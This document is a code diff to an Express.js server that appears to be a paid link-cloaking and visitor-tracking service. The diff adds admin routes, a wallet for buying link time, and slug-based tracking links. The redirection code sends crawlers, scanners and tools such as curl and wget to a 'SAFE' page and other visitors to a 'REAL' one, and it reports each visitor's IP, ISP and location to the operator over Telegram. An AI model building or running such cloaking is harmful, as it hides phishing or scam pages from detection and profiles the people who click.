@@ -48,6 +48,10 @@ app.use(cors({
 
 app.use(express.static('public'));
 
+app.get('/admin', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+});
+
 // --- Authentication Middleware ---
 function requireAuth(req, res, next) {
     if (!req.session.userId) {
@@ -55,6 +59,38 @@ function requireAuth(req, res, next) {
     }
     next();
 }
+
+function requireAdmin(req, res, next) {
+    const token = req.headers['x-admin-token'] || req.query.token;
+    if (token !== process.env.ADMIN_TOKEN) {
+        return res.status(401).json({ error: 'Unauthorized Admin' });
+    }
+    next();
+}
+
+// --- Admin Routes ---
+app.get('/api/admin/users', requireAdmin, async (req, res) => {
+    const users = await db.getUsers();
+    res.json(users.map(({ password, ...u }) => u));
+});
+
+app.post('/api/admin/update-balance', requireAdmin, async (req, res) => {
+    const { userId, amount } = req.body;
+    const user = await db.findUserById(userId);
+    if (!user) return res.status(404).json({ error: 'User not found' });
+    
+    const updatedUser = await db.updateUser(userId, { wallet: parseFloat(amount) });
+    res.json(updatedUser);
+});
+
+app.post('/api/admin/toggle-status', requireAdmin, async (req, res) => {
+    const { userId } = req.body;
+    const user = await db.findUserById(userId);
+    if (!user) return res.status(404).json({ error: 'User not found' });
+    
+    const updatedUser = await db.updateUser(userId, { isActive: !user.isActive });
+    res.json(updatedUser);
+});
 
 // --- Auth Routes ---
 app.post('/api/signup', async (req, res) => {
@@ -128,6 +164,37 @@ app.delete('/api/forced-ips/:ip', requireAuth, async (req, res) => {
     res.json({ message: 'IP removed' });
 });
 
+app.post('/api/generate-link', requireAuth, async (req, res) => {
+    const { duration } = req.body; // '1week', '2weeks', 'month'
+    const prices = { '1week': 25, '2weeks': 50, 'month': 75 };
+    const price = prices[duration];
+
+    if (!price) return res.status(400).json({ error: 'Invalid duration' });
+
+    const user = await db.findUserById(req.session.userId);
+    if (user.wallet < price) {
+        return res.status(400).json({ error: 'Insufficient wallet balance' });
+    }
+
+    const now = new Date();
+    let expiry = new Date(user.expiryDate && new Date(user.expiryDate) > now ? user.expiryDate : now);
+    
+    if (duration === '1week') expiry.setDate(expiry.getDate() + 7);
+    else if (duration === '2weeks') expiry.setDate(expiry.getDate() + 14);
+    else if (duration === 'month') expiry.setMonth(expiry.getMonth() + 1);
+
+    const updatedUser = await db.updateUser(user.id, {
+        wallet: user.wallet - price,
+        expiryDate: expiry.toISOString()
+    });
+
+    res.json({ 
+        message: 'Link generated/extended successfully', 
+        expiryDate: updatedUser.expiryDate,
+        balance: updatedUser.wallet 
+    });
+});
+
 // --- Proxy Redirection Logic ---
 const BOT_UA_REGEX = /googlebot|bingbot|yandexbot|duckduckbot|slurp|baiduspider|facebot|ia_archiver|crawler|spider|robot|curl|wget|python|postman|insomnia|headless|screaming frog|ahrefsbot|semrushbot|mj12bot|dotbot|rogerbot|exabot|petalbot/i;
 
@@ -136,10 +203,29 @@ function isBot(req) {
     return !ua || BOT_UA_REGEX.test(ua);
 }
 
+app.get('/l/:slug', async (req, res) => {
+    const user = await db.findUserBySlug(req.params.slug);
+    if (!user || user.wallet <= 0) {
+        return res.status(404).send('Not Found or Account Inactive');
+    }
+    return handleRedirection(user, req, res);
+});
+
 app.get('/u/:userId', async (req, res) => {
     const user = await db.findUserById(req.params.userId);
     if (!user || user.wallet <= 0) {
         return res.status(404).send('Not Found or Account Inactive');
+    }
+    return handleRedirection(user, req, res);
+});
+
+async function handleRedirection(user, req, res) {
+    if (!user.isActive) {
+        return res.status(403).send('Account Suspended or Inactive');
+    }
+    
+    if (!user.expiryDate || new Date(user.expiryDate) < new Date()) {
+        return res.status(403).send('Tracking Link Expired. Please renew in dashboard.');
     }
 
     const { settings, forcedIps, visitedIps } = user;
@@ -193,13 +279,13 @@ app.get('/u/:userId', async (req, res) => {
         await db.updateUser(user.id, { visitedIps: newVisited });
     }
 
-    // 6. Telegram Notification (if configured)
+    // 6. Telegram Notification
     if (process.env.TELEGRAM_BOT_TOKEN) {
         let message = `🚀 *SaaS Visit!* (User: ${user.name})\n\n`;
         message += `📍 *IP:* ${clientIp}\n🏢 *ISP:* ${data ? data.isp : 'Unknown'}\n🌍 *Location:* ${data ? `${data.city}, ${data.country}` : 'Unknown'}\n💻 *UA:* ${userAgent}\n🎯 *Target:* ${targetUrl === settings.realLink ? 'REAL' : 'SAFE'}`;
         
         axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            chat_id: user.telegram, // Assuming telegram username or ID is provided
+            chat_id: user.telegram,
             text: message,
             parse_mode: 'Markdown'
         }).catch(() => {});
@@ -207,7 +293,7 @@ app.get('/u/:userId', async (req, res) => {
 
     if (!targetUrl) return res.send("Configuration missing for links.");
     res.redirect(targetUrl);
-});
+}
 
 app.listen(port, () => {
     console.log(`SaaS Proxy server running on port ${port}`);
